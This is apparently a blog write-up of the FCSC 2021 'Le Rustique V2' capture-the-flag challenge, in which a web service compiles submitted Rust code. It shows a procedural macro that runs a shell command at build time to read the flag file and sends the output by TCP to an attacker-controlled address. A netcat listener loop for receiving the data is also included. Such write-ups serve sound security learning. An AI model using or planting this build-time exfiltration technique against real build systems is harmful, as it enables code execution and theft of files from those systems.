---
title: "FCSC - Le Rustique V2"
date: 2021-05-03T18:29:31+02:00
draft: false
---

Hey, so I am a beginner in cyber security, but I participated to the [FCSC 2021](https://france-cybersecurity-challenge.fr/).

I love Rust, and this CTF greeted me with a challenge in `misc` category around Rust, giving 500 points (the biggest score for a challenge :D).

So, let's see how I pwned it!

This challenge is actually a website, which, given a program, tries to compile it in a directory related to your session cookie and never executes it. We only know if the compilation succeeded and don't have access to the errors log. The most obvious solution would be to use the `include_*` macros to read the flag, maybe list directories, etc etc, and abuse the strict rust compiler to read the result. You may refer to previous write-ups (by others) about Le Rustique from the FCSC 2020. The problems are, these `include_*` macros are disabled and we don't know the path to the file.

We thus have to figure out another way, and keep in mind the power of macros.

Here are the most important informations (given in the website's FAQ):

> We are confident leaking the compilation command used.
>
> rustc --out-dir=/sessionDir/ -L /sessionDir/ -C opt-level=3 /sessionDir/randomFilename.rs
>
> Note that randomFilename is randomized by the server upon each compilation. sessionDir is a randomly generated folder name based on your session cookie. All the files are cleaned every hour.

First thing to note, the build results are in the same directory which is added to the librairies path.
Can we build a library and include it in another file ?

We need to give a specific or at least predictable name to our build result, and ask the compiler to build it as a library.
That seems impossible since we can't control rustc's parameters, wait...
```rust
#![crate_type = "lib"]
#![crate_name = "mymacro"]
```

Well, problem fixed.
Now we have to figure out how to execute code during build.
The only solution I could think of was using macros, but I didn't know how to read files using them, and without `include_*` macros.
Thanksfully, Rust has a great documentation: https://doc.rust-lang.org/reference/procedural-macros.html .
We can code macros (called procedural macros) in plain Rust, using the standard library, and then execute them from a second file.

To exfiltrate macros' results, the fastest method was to send a TCP packet to a VPS listening with Netcat.
```bash
while :
do
nc -l -p 4242
echo --- WAITING FOR NEXT COMMAND RESULT ---
done
```

You may however note that you could also make a HTTP GET request to services like https://requestcatcher.com/ or use the 'force-failed build' method from write-ups for Le Rustique v1.

Final code :

```rust
// stage1.rs
#![crate_type = "proc-macro"]
#![crate_name = "mymacro"]

use std::process::Command;
use std::net::TcpStream;
use std::io::prelude::*;

extern crate proc_macro;
use proc_macro::TokenStream;

#[proc_macro_attribute]
pub fn hello(_attr: TokenStream, item: TokenStream) -> TokenStream {
    let ls_out = Command::new("cat").arg("/folder_with_a_special_reward/flag_TheFlagIsInThere.txt").output().expect("failed to execute process");

    let mut stream = TcpStream::connect("ADDRESSEIP:4242").unwrap();
    stream.write(&ls_out.stdout).unwrap();

    item
}
```

```rust
// stage2.rs
extern crate mymacro;

use mymacro::hello;

#[hello]
fn main() {}
```

